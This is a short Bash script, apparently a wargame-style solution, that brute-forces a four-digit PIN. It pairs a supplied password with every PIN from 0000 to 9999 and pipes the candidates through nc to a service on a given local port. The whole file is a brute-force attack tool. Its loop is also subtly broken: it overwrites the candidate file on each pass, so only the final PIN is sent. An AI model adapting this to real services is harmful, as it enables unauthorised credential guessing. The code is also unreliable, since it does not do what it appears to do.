#!/bin/bash

function ctrl_c(){
	
	echo "\n\n [+] Saliendo...\n"
	tput cnorm
	exit 1

}

tput civis

# ./bruteForce.sh PASSWORD PORT

if [ $# -eq 0 ]; then
	echo "\n./bruteForce.sh PASSWORD PORT\n"
	tput cnorm
	exit 2
fi

#Ctrl + C
trap ctrl_c INT

for pin in {0000..9999}; do
	echo "$1 $pin" > combinations.txt
done

cat combinations.txt | nc localhost $2 | grep -vE "Wrong|Please enter"
rm combinations.txt

tput cnorm
exit 0

